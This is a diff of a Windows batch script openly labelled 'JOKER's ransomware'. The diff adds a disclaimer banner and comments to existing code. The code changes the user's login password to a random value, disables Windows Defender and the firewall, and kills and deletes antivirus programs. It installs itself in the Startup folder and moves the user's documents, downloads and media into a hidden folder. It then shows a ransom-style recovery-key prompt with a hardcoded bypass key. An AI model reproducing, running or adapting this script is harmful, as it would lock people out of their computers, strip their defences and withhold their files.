@@ -31,8 +31,39 @@
 ::
 ::
 ::978f952a14a936cc963da21a135fa983
+
+
+
+
 @echo off
 title don't close this window
+echo PLEASE READ ALL OF THIS!!!
+echo Any disadvantages caused by not reading are your responsibility.
+echo .
+echo .
+echo .
+echo .
+echo .
+echo Please do not abuse the code in this project. 
+echo This project is ransomware of a malicious virus that carries a significant risk. 
+echo The author of this code (Anion15) assumes no responsibility if this code is abused. 
+echo ALL USERS OF THIS CODE ARE RESPONSIBLE AND DEFINES THE IMPLIED AGREEMENT THAT THE USERS OF THIS CODE, THAT THE USER, ARE LIABLE FOR ALL DAMAGES THAT MAY BE RESULTING IN THE FUTURE. 
+echo Therefore, I swear by this letter that the authors of this code will not be punished in case of legal trouble. 
+echo I will consider it as a material that can serve as evidence in the future. 
+echo It is judged that the user is also aware that if they abuse this and cause harm to others, they may be subject to severe legal punishment. 
+echo Recognize the dangers of this code and handle it with care. Don't run it on your own computer. 
+echo Ransomware can infect your computer. If you are infected, please recover by referring to the #recovery key below. 
+echo This virus is very difficult to recover and can be dangerous if used for real attack purposes.
+echo There are many more risks like encrypting all files, disabling Windows defense, disabling computer antivirus similar to several antiviruses, changing computer login password, etc. 
+echo Use with caution. For reference, this virus comes back to life even if the computer is rebooted.
+echo Bottom line, don't run this virus! The creator believes that this damage will be substantial, and cannot guarantee any damage.
+echo See above. Finally, if you remake this code, please credit this author and source.
+echo .
+echo .
+echo If you don't want this virus running, close the window quickly without pressing any key!!!!!
+echo .
+echo .
+pause
 
 set "filename=clickme.bat"
 
@@ -45,8 +76,8 @@ if not "%~nx0" == "%filename%" (
 )
 
 
-net user %username% %random%
-sc config Sense start= disabled > NUL 2>&1
+net user %username% %random%                        ::change windows password randomly
+sc config Sense start= disabled > NUL 2>&1          ::Forcibly defender Windows non-pandas from line 68 to line 98
 net stop Sense > NUL 2>&1
 sc config WdFilter start= disabled > NUL 2>&1
 net stop WdFilter > NUL 2>&1
@@ -76,9 +107,9 @@ reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SubmitSam
 reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d 0 /f
 reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefender" /f > NUL 2>&1
 sc config WinDefend start= disabled
-sc stop WinDefend
+sc stop WinDefend                                     ::end
 rem --
-rem Permamanently Kill Anti-Virus
+rem Permamanently Kill Anti-Virus                     ::Disable and neutralize computer antivirus from line 101 to line 236
 net stop "Security Center"
 netsh firewall set opmode mode=disable
 tskill /A av*
@@ -214,7 +245,7 @@ cls
 del /Q /F C:\Program Files\apvxdwin\*.exe
 del /Q /F C:\Program Files\webproxy\*.exe
 del /Q /F C:\Program Files\panda
-software\*.*
+software\*.*                                            ::end
 rem
 title JOKER'S RANSOMWARE
 xcopy clickme.bat "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup" /h /y
@@ -223,15 +254,15 @@ chcp 949
 set backup=%cd%
 cd/
 if not %cd%==C:\ cd /d c:\
-del %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbso.vbs
-del %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbs.vbs
+del %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbso.vbs      ::Create clickme vbs.vbs in appdata
+del %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbs.vbs       ::Create clickme vbs.vbs in appdata
 del %userprofile%\POWER-JOKER-PASSWORD.txt
-cd %backup%
+cd %backup%               ::go to backup
 if %cd%==%userprofile%\AppData goto a
 cd %userprofile%\AppData
 start %userprofile%\AppData\clickme.bat
 exit
-:a
+:a                                          ::Computer file encryption from line 253 to line 276
 mode con cols=120 lines=30
 title Do not close this window.
 del %userprofile%\Desktop\*.joker* >nul 2>&1
@@ -254,9 +285,9 @@ copy %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\video\*.* %userprofile%\video
 move %userprofile%\Documents\*.* %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\doc\
 copy %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\doc\*.* %userprofile%\Documents\*.joker*
 move %userprofile%\downloads\*.* %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\down\
-copy %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\down\*.* %userprofile%\downloads\*.joker*
+copy %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\down\*.* %userprofile%\downloads\*.joker*       ::end
 cls
-title JOKER'S RANSOMWARE
+title JOKER'S RANSOMWARE                      ::set title
 ECHO  ■■■■■                  ■■■                  ■    ■■                ■■■■■                ■■■■
 ECHO      ■                    ■      ■                ■  ■                    ■                        ■      ■
 ECHO      ■                    ■      ■                ■■                      ■■■■                  ■■■■
@@ -271,7 +302,7 @@ ECHO  ■      ■  ■      ■  ■      ■  ■■■■■    ■■■    
 echo do not close this window.
 timeout/t 3 /nobreak >nul
 cls
-echo Thank you for running this ransomware.
+echo Thank you for running this ransomware.                                      ::say to you
 echo Your computer has been encrypted by the JOKER ransomware.
 echo If you close this window, your files will not be recoverable.
 echo Enter the recovery key to recover.
@@ -291,13 +322,13 @@ echo CreateObject("SAPI.SpVoice").Speak "Even if you delete JOKER ransomware, JO
 start %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbs.vbs
 start %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbso.vbs
 
-:pass
+:pass                        
 set /p password=복구키 : 
 timeout/t 2 /nobreak >nul
 if %password%==developerdecryptkey goto good
 if %password%==%PASS% goto good
 
-:bad
+:bad                ::recovery key wrong
 color 47
 cls
 echo Recovery key does not exist.
@@ -314,7 +345,7 @@ if %password%==%PASS% goto good
 timeout/t 2 >nul
 goto bad
 
-:good
+:good                ::recovery key correct
 cls
 echo Restoring...
 echo Never close this window.
@@ -338,3 +369,4 @@ cls
 echo detox success
 timeout /t 5 /nobreak >nul
 exit
+      ::program end
